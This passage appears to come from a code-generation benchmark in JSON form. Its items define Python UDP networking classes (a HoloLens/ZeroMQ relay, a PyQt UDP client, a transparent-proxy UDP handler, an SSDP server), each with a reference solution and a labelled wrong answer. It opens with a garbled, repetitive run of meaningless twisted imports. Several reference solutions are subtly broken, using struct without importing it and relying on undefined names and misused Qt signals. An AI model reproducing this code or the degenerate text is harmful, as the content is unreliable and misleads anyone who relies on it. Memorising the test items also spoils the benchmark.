http_xmlrpc333\nfrom twisted.web import http_xmlrpc334\nfrom twisted.web import http_xmlrpc335\nfrom twisted.web import http_xmlrpc336\nfrom twisted.web import http_xmlrpc337\nfrom twisted.web import http_xmlrpc338\nfrom twisted.web import http_xmlrpc339\nfrom twisted.web import http_xmlrpc340\nfrom twisted.web import http_xmlrpc341\nfrom twisted.web import http_xmlrpc342\nfrom twisted.web import http_xmlrpc343\nfrom twisted.web import http_xmlrpc344\nfrom twisted.web import http_xmlrpc345\nfrom twisted.web import http_xmlrpc346\nfrom twisted.web import http_xmlrpc347\nfrom twisted.web import http_xmlrpc348\nfrom twisted.web import http_xmlrpc349\nfrom twisted.web import http_xmlrpc350\nfrom twisted.web import http_xmlrpc351\nfrom twisted.web import http_xmlrpc352\nfrom twisted.web import http_xmlrpc353\nfrom twisted.web import http_xmlrpc354\nfrom twisted.web import http_xmlrpc355\nfrom twisted.web import http_xmlrpc356\nfrom twisted.web import http_xmlrpc357\nfrom twisted.web import http_xmlrpc358\nfrom twisted.web import http_xmlrpc359\nfrom twisted.web import http_xmlrpc360\nfrom twisted.web import http_xmlrpc361\nfrom twisted.web import http_xmlrpc362\nfrom twisted.web import http_xmlrpc363\nfrom twisted.web import http_xmlrpc364\nfrom twisted.web import http_xmlrpc365\nfrom twisted.web import http_xmlrpc366\nfrom twisted.web import http_xmlrpc367\nfrom twisted.web import http_xmlrpc368\nfrom twisted.web import http_xmlrpc369\nfrom twisted.web import http_xmlrpc370\nfrom twisted.web import http_xmlrpc371\nfrom twisted.web import http_xmlrpc372\nfrom twisted.web import http_xmlrpc373\nfrom twisted.web import http_xmlrpc374\nfrom twisted.web import http_xmlrpc375\nfrom twisted.web import http_xmlrpc376\nfrom twisted.web import http_xmlrpc377\nfrom twisted.web import http_xmlrpc378\nfrom twisted.web import http_xmlrpc379\nfrom twisted.web import http_xmlrpc380\nfrom twisted.web import http_xmlrpc381\nfrom twisted.web import http_xmlrpc382\nfrom twisted.web import http_xmlrpc383\nfrom twisted.web import http_xmlrpc384\nfrom twisted.web import http_xmlrpc385\nfrom twisted.web import http_xmlrpc386\nfrom twisted.web import http_xmlrpc387\nfrom twisted.web import http_xmlrpc388\nfrom twisted.web import http_xmlrpc389\nfrom twisted.web import http_xmlrpc390\nfrom twisted.web import http_xmlrpc391\nfrom twisted.web import http_xmlrpc392\nfrom twisted.web import http_xmlrpc393\nfrom twisted.web import http_xmlrpc394\nfrom twisted.web import http_xmlrpc395\nfrom twisted.web import http_xmlrpc396\nfrom twisted.web import http_xmlrpc397\nfrom twisted.web import http_xmlrpc398\nfrom twisted.web import http_xmlrpc399\nfrom twisted.web import http_xmlrpc400\nfrom twisted.web import http_xmlrpc401\nfrom twisted.web import http_xmlrpc402\nfrom twisted.web import http_xmlrpc403\nfrom twisted.web import http_xmlrpc404\nfrom twisted.web import http_xmlrpc405\nfrom twisted.web import http_xmlrpc406\nfrom twisted.web import http_xmlrpc407\nfrom twisted.web import http_xmlrpc408\nfrom twisted.web import http_xmlrpc409\nfrom twisted.web import http_xmlrpc410\nfrom twisted.web import http_xmlrpc411\nfrom twisted.web import http_xmlrpc412\nfrom twisted.web import http_xmlrpc413\nfrom twisted.web import http_xmlrpc414\nfrom twisted.web import http_xmlrpc415\nfrom twisted.web import http_xmlrpc416\nfrom twisted.web import http_xml"
  },
  {
    "Task_id": 423,
    "Instruction": "Task Description: Create a UDP-based relay class for HoloLens communication that handles both receiving data from HoloLens and forwarding it via ZeroMQ, as well as receiving commands from ZeroMQ and sending responses back to HoloLens.\n\nClass Description: Hololens_Relay is a class that establishes a bidirectional communication bridge between a HoloLens device (via UDP) and other processes (via ZeroMQ). It manages socket connections, message routing, and protocol handling for gaze data and calibration results.\n\nAttributes:\n- context: [zmq.Context] - ZeroMQ context for IPC communication\n- thread_pipe: [zmq.Socket] - Pipe for communicating with the worker thread\n- host: [str] - Host address for UDP binding\n- port: [str] - Port number for UDP binding\n- ipc_push_url: [str] - ZeroMQ URL for pushing messages\n- ipc_sub_url: [str] - ZeroMQ URL for subscribing to messages\n- gaze_receiver: [tuple] - Address of the current gaze data receiver\n- calib_result_receiver: [tuple] - Address of the current calibration result receiver\n\nMethods:\n- __init__(zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\") -> [None] - Initializes the relay with ZMQ context and connection URLs\n- start_server(new_address) -> [bool] - Binds the UDP socket to the specified address and starts the server\n- stop_server() -> [None] - Stops the server and cleans up resources\n- thread_loop(context, pipe) -> [None] - Main worker thread that handles message polling and routing (private method)\n- on_recv(socket, ipc_pub) -> [None] - Handles incoming UDP messages and generates appropriate responses (private method)",
    "Canonical_solution": "import socket\nimport zmq\nimport zmq_tools\nfrom pyre import zhelper\n\nclass Hololens_Relay:\n    def __init__(self, zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\"):\n        self.context = zmq_ctx\n        self.thread_pipe = zhelper.zthread_fork(self.context, self.thread_loop)\n        self.host = host\n        self.port = port\n        self.ipc_push_url = ipc_push_url\n        self.ipc_sub_url = ipc_sub_url\n        self.start_server(f\"{host}:{port}\")\n\n    def start_server(self, new_address):\n        self.thread_pipe.send_string(\"Bind\", flags=zmq.SNDMORE)\n        self.thread_pipe.send_string(new_address)\n        response = self.thread_pipe.recv_string()\n        msg = self.thread_pipe.recv_string()\n        if response == \"Bind OK\":\n            host, port = msg.split(\":\")\n            self.host = host\n            self.port = port\n            return True\n        return False\n\n    def stop_server(self):\n        self.thread_pipe.send_string(\"Exit\")\n        while self.thread_pipe:\n            pass\n\n    def thread_loop(self, context, pipe):\n        poller = zmq.Poller()\n        ipc_pub = zmq_tools.Msg_Dispatcher(context, self.ipc_push_url)\n        ipc_sub = zmq_tools.Msg_Receiver(\n            context,\n            self.ipc_sub_url,\n            (\"gaze\", \"notify.calibration.failed\", \"notify.calibration.successful\"),\n        )\n        poller.register(pipe, zmq.POLLIN)\n        poller.register(ipc_sub.socket, zmq.POLLIN)\n        remote_socket = None\n        self.gaze_receiver = None\n        self.calib_result_receiver = None\n\n        while True:\n            items = [sock for sock, _ in poller.poll()]\n            if pipe in items:\n                cmd = pipe.recv_string()\n                if cmd == \"Exit\":\n                    break\n                elif cmd == \"Bind\":\n                    new_url = pipe.recv_string()\n                    if remote_socket:\n                        poller.unregister(remote_socket)\n                        remote_socket.close()\n                    try:\n                        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n                        remote_socket.setblocking(False)\n                        addr, port = new_url.split(\":\")\n                        socket_addr = (addr, int(port))\n                        remote_socket.bind(socket_addr)\n                    except OSError:\n                        remote_socket = None\n                        pipe.send_string(\"Error\", flags=zmq.SNDMORE)\n                        pipe.send_string(f\"Could not bind to Socket: {new_url}\")\n                    else:\n                        pipe.send_string(\"Bind OK\", flags=zmq.SNDMORE)\n                        pipe.send_string(new_url)\n                        poller.register(remote_socket, zmq.POLLIN)\n\n            if remote_socket and remote_socket.fileno() in items:\n                self.on_recv(remote_socket, ipc_pub)\n\n            if ipc_sub.socket in items:\n                while ipc_sub.new_data:\n                    topic, payload = ipc_sub.recv()\n                    if self.gaze_receiver and remote_socket and topic.startswith(\"gaze\"):\n                        method, eye = payload[\"topic\"].split(\".\")[1:3]\n                        if method == \"2d\":\n                            data = b\"EG%s%s%s\" % (\n                                method[:1].encode(),\n                                eye.encode(),\n                                struct.pack(\"ff\", *payload[\"norm_pos\"]),\n                            )\n                        elif method == \"3d\":\n                            data = b\"EG%s%s%s\" % (\n                                method[:1].encode(),\n                                eye.encode(),\n                                struct.pack(\"fff\", *payload[\"gaze_point_3d\"]),\n                            )\n                        remote_socket.sendto(data, self.gaze_receiver)\n\n                    elif (self.calib_result_receiver and remote_socket and \n                          topic.startswith(\"notify.calibration.\")):\n                        if payload[\"subject\"] == \"calibration.successful\":\n                            remote_socket.sendto(b\"ECS\", self.calib_result_receiver)\n                            self.calib_result_receiver = None\n                        elif payload[\"subject\"] == \"calibration.failed\":\n                            remote_socket.sendto(b\"ECF\", self.calib_result_receiver)\n                            self.calib_result_receiver = None\n\n        if remote_socket:\n            remote_socket.close()\n\n    def on_recv(self, socket, ipc_pub):\n        try:\n            byte_msg, sender = socket.recvfrom(2048)\n        except OSError:\n            return\n\n        if byte_msg[:1] == b\"R\":\n            try:\n                ipc_pub.socket.send_string(\"notify.calibration.add_ref_data\", flags=zmq.SNDMORE)\n                ipc_pub.socket.send(byte_msg[1:])\n                response = b\"0R\"\n            except Exception as e:\n                response = b\"FRReference point mal-formatted or missing: %s\" % str(e).encode()\n        elif byte_msg[:1] == b\"S\":\n            self.gaze_receiver = sender\n            response = b\"0S\"\n        elif byte_msg[:1] == b\"s\":\n            self.gaze_receiver = None\n            response = b\"0s\"\n        elif byte_msg[:1] == b\"I\":\n            mode = byte_msg[1:2]\n            init_2d = mode == b\"2\"\n            calib_method = \"HMD_Calibration\" if init_2d else \"HMD_Calibration_3D\"\n            ipc_pub.notify({\"subject\": \"start_plugin\", \"name\": calib_method})\n            response = b\"0I\"\n        elif byte_msg[:1] == b\"i\":\n            response = b\"0i\"\n        elif byte_msg[:1] == b\"C\":\n            self.calib_result_receiver = sender\n            response = b\"0C\"\n        elif byte_msg[:1] == b\"c\":\n            response = b\"0c\"\n        elif byte_msg[:1] == b\"T\":\n            try:\n                target = struct.unpack(\"f\", byte_msg[1:])[0]\n                response = b\"0T\"\n            except Exception:\n                response = b\"FT'%s' cannot be converted to float.\" % (byte_msg[1])\n        elif byte_msg[:1] == b\"V\":\n            response = b\"0V%s\" % bytes(__version__)\n        else:\n            response = b'FFUnknown command. \"%s\"' % byte_msg\n\n        socket.sendto(response, sender)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport zmq\nimport socket\nimport threading\nimport struct\nimport time\n\nclass Hololens_Relay:\n    def __init__(self, zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\"):\n        self.context = zmq_ctx\n        self.thread_pipe = self.context.socket(zmq.PAIR)\n        self.host = host\n        self.port = port\n        self.ipc_push_url = ipc_push_url\n        self.ipc_sub_url = ipc_sub_url\n        self.gaze_receiver = None\n        self.calib_result_receiver = None\n\n    def start_server(self, new_address):\n        self.host, self.port = new_address\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.bind((self.host, int(self.port)))\n        self.thread_pipe.bind(\"inproc://threadpipe\")\n        self.thread = threading.Thread(target=self.thread_loop, args=(self.context, self.thread_pipe))\n        self.thread.start()\n        return True\n\n    def stop_server(self):\n        self.thread_pipe.send(b\"STOP\")\n        self.thread.join()\n        self.sock.close()\n        self.thread_pipe.close()\n\n    def thread_loop(self, context, pipe):\n        ipc_pub = context.socket(zmq.PUB)\n        ipc_pub.bind(self.ipc_push_url)\n        ipc_sub = context.socket(zmq.SUB)\n        ipc_sub.connect(self.ipc_sub_url)\n        ipc_sub.setsockopt(zmq.SUBSCRIBE, b\"\")\n\n        while True:\n            if pipe.poll(0):\n                if pipe.recv() == b\"STOP\":\n                    break\n            if ipc_sub.poll(0):\n                msg = ipc_sub.recv()\n                if msg[0] == 0:\n                    self.gaze_receiver = struct.unpack(\"=4sI\", msg[1:7])\n                elif msg[0] == 1:\n                    self.calib_result_receiver = struct.unpack(\"=4sI\", msg[1:7])\n            self.on_recv(self.sock, ipc_pub)\n\n    def on_recv(self, socket, ipc_pub):\n        data, addr = socket.recvfrom(1024)\n        if data[0] == 0:\n            if self.gaze_receiver is not None and self.gaze_receiver[0] == addr[0]:\n                ipc_pub.send_multipart([b\"gaze\", data[1:]])\n        elif data[0] == 1:\n            if self.calib_result_receiver is not None and self.calib_result_receiver[0] == addr[0]:\n                ipc_pub.send_multipart([b\"calib_result\", data[1:]])\n        elif data[0] == 2:\n            if self.gaze_receiver is not None and self.gaze_receiver[0] == addr[0]:\n                ipc_pub.send_multipart([b\"gaze\", data[1:]])\n            if self.calib_result_receiver is not None and self.calib_result_receiver[0] == addr[0]:\n                ipc_pub.send_multipart([b\"calib_result\", data[1:]])\n        time.sleep(0.001)\n```\n"
  },
  {
    "Task_id": 424,
    "Instruction": "Task Description: Implement a UDP communication class that handles socket creation, data transmission, and reception with proper connection management and error handling.\n\nClass Description: The UDPCommunication class provides functionality for UDP-based network communication, including opening/closing connections, sending/receiving data, and managing connection status. It uses threading for asynchronous data reception and includes signal-based notification for connection status changes.\n\nAttributes:\n- conn: [socket.socket] - The UDP socket object used for communication\n- status: [ConnectionStatus] - Current connection status (CONNECTED/CLOSED)\n- config: [dict] - Configuration dictionary containing protocol, port, and target information\n- onConnectionStatus: [pyqtSignal] - Signal emitted when connection status changes\n- hintSignal: [pyqtSignal] - Signal for displaying error messages or hints\n- receiveProcess: [threading.Thread] - Thread handling incoming data reception\n\nMethods:\n- __init__() -> None - Initializes the UDP communication object with default configuration\n- openCloseSerial() -> None - Toggles connection state (opens if closed, closes if open)\n- receiveDataProcess(conn: socket.socket) -> None - Thread function for receiving data (private method)\n- send(data: bytes) -> None - Sends data to configured target\n- checkTarget(target: str) -> tuple - Validates and parses target address into (host, port) tuple\n- isConnected() -> bool - Returns current connection status\n- getConnStatus() -> ConnectionStatus - Returns current connection status object",
    "Canonical_solution": "from PyQt5.QtCore import pyqtSignal, QObject\nimport socket\nimport threading\nimport time\nimport re\n\nclass UDPCommunication:\n    def __init__(self):\n        self.conn = None\n        self.status = ConnectionStatus.CLOSED\n        self.config = {\n            \"protocol\": \"udp\",\n            \"port\": 2345,\n            \"target\": [\"127.0.0.1:2345\", [\"127.0.0.1:2345\"]]\n        }\n        self.onConnectionStatus = pyqtSignal(ConnectionStatus, str)\n        self.hintSignal = pyqtSignal(str, str, str)\n\n    def openCloseSerial(self):\n        if self.status == ConnectionStatus.CLOSED:\n            try:\n                self.conn = socket.socket(type=socket.SOCK_DGRAM)\n                self.conn.bind((\"0.0.0.0\", self.config[\"port\"]))\n                self.status = ConnectionStatus.CONNECTED\n                self.receiveProcess = threading.Thread(target=self.receiveDataProcess, args=(self.conn,))\n                self.receiveProcess.setDaemon(True)\n                self.receiveProcess.start()\n                self.onConnectionStatus.emit(self.status, \"\")\n            except Exception as e:\n                msg = _(\"Connect Failed\") + \"\\n\" + str(e)\n                self.hintSignal.emit(\"error\", _(\"Error\"), msg)\n                self.status = ConnectionStatus.CLOSED\n                self.onConnectionStatus.emit(self.status, msg)\n        else:\n            self.status = ConnectionStatus.CLOSED\n            if self.conn:\n                self.conn.close()\n                self.conn = None\n            self.onConnectionStatus.emit(self.status, \"\")\n\n    def receiveDataProcess(self, conn):\n        buffer = b''\n        t = 0\n        conn.settimeout(0.1)\n        while self.status != ConnectionStatus.CLOSED:\n            try:\n                data, target = conn.recvfrom(4096)\n                if data:\n                    if len(data) > 4096:\n                        flush = False\n                    t = time.time()\n                    buffer += data\n                    if buffer and (time.time() - t > 0.001):\n                        try:\n                            if buffer:\n                                self.onReceived(buffer)\n                        except Exception as e:\n                            print(\"-- error in onReceived callback:\", e)\n                        buffer = b''\n            except socket.timeout:\n                continue\n            except Exception as e:\n                print(\"-- recv error:\", e)\n                self.status = ConnectionStatus.CLOSED\n                self.onConnectionStatus.emit(self.status, _(\"Connection closed!\") + \" \" + str(e))\n                try:\n                    conn.close()\n                except Exception:\n                    pass\n                break\n\n    def send(self, data: bytes):\n        if self.conn and self.status == ConnectionStatus.CONNECTED:\n            target = self.checkTarget(self.config[\"target\"][0])\n            if not target:\n                self.hintSignal.emit(\"error\", _(\"Target error\"), _(\"Target error\") + \": \" + self.config[\"target\"])\n            self.conn.sendto(data, target)\n\n    def checkTarget(self, target):\n        if not target:\n            return None\n        host = target\n        port = 80\n        target = target.replace(\"\uff1a\", \":\")\n        if target.endswith(\":\"):\n            target = target[:-1]\n        _host = re.match('http(.*)://(.*)', target)\n        if _host:\n            s, target = _host.groups()\n            host = target\n        _host = re.match('(.*):(\\d*)', target)\n        if _host:\n            host, port = _host.groups()\n            port = int(port)\n        if host.endswith(\"/\"):\n            host = host[:-1]\n        return (host, port)\n\n    def isConnected(self):\n        return self.status == ConnectionStatus.CONNECTED\n\n    def getConnStatus(self):\n        return self.status",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport threading\nfrom PyQt5.QtCore import pyqtSignal\n\nclass ConnectionStatus:\n    CONNECTED = 1\n    CLOSED = 0\n\nclass UDPCommunication:\n    def __init__(self):\n        self.conn = None\n        self.status = ConnectionStatus.CLOSED\n        self.config = {\n            'protocol': 'UDP',\n            'port': 0,\n            'target': None\n        }\n        self.onConnectionStatus = pyqtSignal(ConnectionStatus)\n        self.hintSignal = pyqtSignal(str)\n        self.receiveProcess = None\n\n    def openCloseSerial(self):\n        if self.status == ConnectionStatus.CLOSED:\n            self.open()\n        else:\n            self.close()\n\n    def receiveDataProcess(self, conn):\n        while self.status == ConnectionStatus.CONNECTED:\n            try:\n                data, addr = conn.recvfrom(1024)\n                if data:\n                    self.hintSignal.emit(f\"Received data from {addr}: {data}\")\n            except Exception as e:\n                self.hintSignal.emit(f\"Error receiving data: {e}\")\n                break\n\n    def send(self, data):\n        if self.status == ConnectionStatus.CONNECTED:\n            try:\n                self.conn.sendto(data, self.config['target'])\n            except Exception as e:\n                self.hintSignal.emit(f\"Error sending data: {e}\")\n\n    def checkTarget(self, target):\n        try:\n            host, port = target.split(':')\n            port = int(port)\n            return (host, port)\n        except Exception as e:\n            self.hintSignal.emit(f\"Invalid target format: {e}\")\n            return None\n\n    def isConnected(self):\n        return self.status == ConnectionStatus.CONNECTED\n\n    def getConnStatus(self):\n        return self.status\n\n    def open(self):\n        if self.status == ConnectionStatus.CLOSED:\n            try:\n                self.conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n                self.conn.bind(('', self.config['port']))\n                self.config['target'] = self.checkTarget('localhost:12345')\n                if self.config['target']:\n                    self.status = ConnectionStatus.CONNECTED\n                    self.onConnectionStatus.emit(self.status)\n                    self.receiveProcess = threading.Thread(target=self.receiveDataProcess, args=(self.conn,))\n                    self.receiveProcess.start()\n            except Exception as e:\n                self.hintSignal.emit(f\"Error opening connection: {e}\")\n\n    def close(self):\n        if self.status == ConnectionStatus.CONNECTED:\n            try:\n                self.conn.close()\n                self.status = ConnectionStatus.CLOSED\n                self.onConnectionStatus.emit(self.status)\n                self.receiveProcess.join()\n            except Exception as e:\n                self.hintSignal.emit(f\"Error closing connection: {e}\")\n```\n"
  },
  {
    "Task_id": 425,
    "Instruction": "Task Description: Implement a UDP socket handler class that facilitates UDP communication with advanced features like receiving destination address information and binding to any available interface.\n\nClass Description: The UDPSocketHandler class provides methods for setting up UDP listeners, receiving UDP packets with ancillary data (including destination address), and sending UDP packets with specific source binding. It's designed for scenarios where you need detailed control over UDP communication, such as when implementing network proxies or specialized UDP services.\n\nAttributes:\n[Note: The reference implementation doesn't show any instance attributes, but uses class-level constants]\nIP_BINDANY: [int] - Socket option constant for binding to any available interface\nIP_RECVDSTADDR: [int] - Socket option constant for receiving destination address information\n\nMethods:\nMethod1: recv_udp(listener: socket.socket, bufsize: int) -> tuple - Receives UDP data along with source and destination address information\n  Parameters:\n    - listener: The UDP socket to receive data from\n    - bufsize: Maximum amount of data to receive\n  Returns:\n    - tuple: (srcip, dstip, data) where:\n      srcip: Source address (IP, port)\n      dstip: Destination address (IP, port) or None\n      data: Received data\n\nMethod2: send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None - Sends UDP data with specific source binding\n  Parameters:\n    - sock: The original socket (used for family information)\n    - srcip: Source address (IP, port) to bind to\n    - dstip: Destination address (IP, port) to send to\n    - data: Data to send\n  Returns: None\n\nMethod3: setup_udp_listener(udp_listener: object) -> None - Configures a UDP listener socket to receive destination address information\n  Parameters:\n    - udp_listener: An object containing v4 and/or v6 socket instances\n  Returns: None",
    "Canonical_solution": "import socket\nimport subprocess as ssubprocess\nfrom sshuttle.helpers import debug1, debug3, Fatal\n\nIP_BINDANY = 24\nIP_RECVDSTADDR = 7\n\nclass UDPSocketHandler:\n    def __init__(self):\n        pass\n\n    def recv_udp(self, listener, bufsize):\n        debug3('Accept UDP python using recvmsg.')\n        data, ancdata, _, srcip = listener.recvmsg(4096,\n                                                  socket.CMSG_SPACE(4))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_RECVDSTADDR:\n                port = 53\n                ip = socket.inet_ntop(socket.AF_INET, cmsg_data[0:4])\n                dstip = (ip, port)\n                break\n        return (srcip, dstip, data)\n\n    def send_udp(self, sock, srcip, dstip, data):\n        if not srcip:\n            debug1(\n               \"-- ignored UDP to %r: \"\n               \"couldn't determine source IP address\" % (dstip,))\n            return\n\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_IP, IP_BINDANY, 1)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener):\n        if udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(socket.SOL_IP, IP_RECVDSTADDR, 1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\n\nclass UDPSocketHandler:\n    IP_BINDANY = socket.AI_PASSIVE\n    IP_RECVDSTADDR = socket.SO_REUSEADDR\n\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> tuple:\n        try:\n            data, ancdata, flags, srcip = listener.recvmsg(bufsize)\n            dstip = ancdata[0][1] if ancdata else None\n            return srcip, dstip, data\n        except BlockingIOError:\n            return None, None, None\n\n    def send_udp(self, sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None:\n        sock.sendto(data, dstip, src=srcip)\n\n    def setup_udp_listener(self, udp_listener: object) -> None:\n        for sock in udp_listener:\n            sock.setsockopt(socket.SOL_IP, self.IP_RECVDSTADDR, 1)\n            sock.setsockopt(socket.SOL_SOCKET, self.IP_BINDANY, 1)\n```\n"
  },
  {
    "Task_id": 428,
    "Instruction": "Task Description: Implement a Simple Service Discovery Protocol (SSDP) server using UDP multicast communication to handle device discovery and announcement in a network.\n\nClass Description: The SSDPServer class implements an SSDP server that listens for M-SEARCH requests and responds with device information. It supports device registration, unregistration, and sending byebye notifications when shutting down.\n\nAttributes:\n- ip_list: [list] - List of tuples containing local IP addresses and their subnet masks\n- sock_list: [list] - List of socket objects for each IP address\n- sock: [socket.socket] - Main UDP socket for communication\n- running: [bool] - Flag indicating if the server is running\n- ssdp_thread: [threading.Thread] - Thread running the server's main loop\n- sending_byebye: [bool] - Flag controlling whether to send byebye notifications\n- known: [dict] - Dictionary of registered services with their USN as keys\n\nMethods:\n- __init__() -> None - Initializes the SSDP server with default values\n- start() -> None - Starts the SSDP server thread\n- stop(byebye: bool) -> None - Stops the SSDP server thread, with option to send byebye notifications\n- run() -> None - Main server loop that handles incoming requests\n- datagram_received(data: bytes, host_port: tuple) -> None - Processes incoming UDP datagrams\n- discovery_request(headers: dict, host_port: tuple) -> None - Handles M-SEARCH discovery requests\n- get_subnet_ip(ip: str, mask: str) -> list - Calculates subnet IP address\n- shutdown() -> None - Cleans up resources and sends byebye notifications\n- register(usn: str, st: str, location: str, server: str, cache_control: str) -> None - Registers a new service\n- unregister(usn: str) -> None - Unregisters a service\n- do_byebye(usn: str) -> None - Sends byebye notification for a service\n- send_it(response: str, destination: tuple) -> None - Sends a response to the specified destination",
    "Canonical_solution": "import sys\nimport random\nimport socket\nimport logging\nimport threading\nfrom email.utils import formatdate\n\nSSDP_PORT = 1900\nSSDP_ADDR = '239.255.255.250'\nSERVER_ID = 'SSDP Server'\n\nclass SSDPServer:\n    def __init__(self):\n        self.ip_list = []\n        self.sock_list = []\n        self.sock = None\n        self.running = False\n        self.ssdp_thread = None\n        self.sending_byebye = True\n        self.known = {}\n\n    def start(self):\n        if not self.running:\n            self.running = True\n            self.sending_byebye = True\n            self.ssdp_thread = threading.Thread(target=self.run, name=\"SSDP_THREAD\")\n            self.ssdp_thread.start()\n\n    def stop(self, byebye=True):\n        if self.running:\n            self.running = False\n            try:\n                socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b'', (SSDP_ADDR, SSDP_PORT))\n            except Exception:\n                pass\n            self.sending_byebye = byebye\n            if self.ssdp_thread is not None:\n                self.ssdp_thread.join()\n\n    def run(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)\n\n        if sys.platform == 'win32':\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        elif sys.platform == 'darwin':\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n        elif hasattr(socket, \"SO_REUSEPORT\"):\n            try:\n                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n            except socket.error:\n                try:\n                    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n                except socket.error:\n                    pass\n\n        self.ip_list = [('192.168.137.1', '255.255.255.0')] if sys.platform == 'win32' else []\n        self.sock_list = []\n        for ip, mask in self.ip_list:\n            try:\n                mreq = socket.inet_aton(SSDP_ADDR) + socket.inet_aton(ip)\n                self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\n                self.sock_list.append(Sock(ip))\n            except Exception:\n                pass\n\n        try:\n            self.sock.bind(('0.0.0.0', SSDP_PORT))\n        except Exception:\n            return\n        self.sock.settimeout(1)\n\n        while self.running:\n            try:\n                data, addr = self.sock.recvfrom(1024)\n                self.datagram_received(data, addr)\n            except socket.timeout:\n                continue\n\n        self.shutdown()\n        for ip, mask in self.ip_list:\n            mreq = socket.inet_aton(SSDP_ADDR) + socket.inet_aton(ip)\n            try:\n                self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_DROP_MEMBERSHIP, mreq)\n            except Exception:\n                continue\n        self.sock.close()\n        self.sock = None\n\n    def datagram_received(self, data, host_port):\n        try:\n            header = data.decode().split('\\r\\n\\r\\n')[0]\n        except ValueError:\n            return\n        if len(header) == 0:\n            return\n\n        lines = header.split('\\r\\n')\n        cmd = lines[0].split(' ')\n        lines = map(lambda x: x.replace(': ', ':', 1), lines[1:])\n        lines = filter(lambda x: len(x) > 0, lines)\n        headers = dict(map(lambda x: (x[0].lower(), x[1]), [x.split(':', 1) for x in lines]))\n\n        if cmd[0] == 'M-SEARCH' and cmd[1] == '*':\n            self.discovery_request(headers, host_port)\n\n    def discovery_request(self, headers, host_port):\n        (host, port) = host_port\n        for i in self.known.values():\n            if i['ST'] == headers['st'] or headers['st'] == 'ssdp:all':\n                response = ['HTTP/1.1 200 OK']\n                usn = None\n                for k, v in i.items():\n                    if k == 'USN':\n                        usn = v\n                    response.append('%s: %s' % (k, v))\n\n                if usn:\n                    response.append('DATE: %s' % formatdate(timeval=None, localtime=False, usegmt=True))\n                    response.extend(('', ''))\n                    destination = (host, port)\n                    for ip, mask in self.ip_list:\n                        if self.get_subnet_ip(ip, mask) == self.get_subnet_ip(host, mask):\n                            self.sock.sendto('\\r\\n'.join(response).format(ip).encode(), destination)\n                            break\n\n    def get_subnet_ip(self, ip, mask):\n        a = [int(n) for n in mask.split('.')]\n        b = [int(n) for n in ip.split('.')]\n        return [a[i] & b[i] for i in range(4)]\n\n    def shutdown(self):\n        for st in self.known:\n            self.do_byebye(st)\n        usn = [st for st in self.known]\n        for st in usn:\n            self.unregister(st)\n\n    def register(self, usn, st, location, server=SERVER_ID, cache_control='max-age=1800'):\n        self.known[usn] = {\n            'USN': usn,\n            'LOCATION': location,\n            'ST': st,\n            'EXT': '',\n            'SERVER': server,\n            'CACHE-CONTROL': cache_control\n        }\n\n    def unregister(self, usn):\n        del self.known[usn]\n\n    def do_byebye(self, usn):\n        if not self.sending_byebye:\n            return\n\n        resp = [\n            'NOTIFY * HTTP/1.1',\n            'HOST: %s:%d' % (SSDP_ADDR, SSDP_PORT),\n            'NTS: ssdp:byebye',\n        ]\n        try:\n            stcpy = dict(self.known[usn].items())\n            stcpy['NT'] = stcpy['ST']\n            del stcpy['ST']\n            resp.extend(map(lambda x: ': '.join(x), stcpy.items()))\n            resp.extend(('', ''))\n            if self.sock:\n                try:\n                    self.send_it('\\r\\n'.join(resp), (SSDP_ADDR, SSDP_PORT))\n                except (AttributeError, socket.error):\n                    pass\n        except KeyError:\n            pass\n\n    def send_it(self, response, destination):\n        for sock in self.sock_list:\n            sock.send_it(response, destination)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
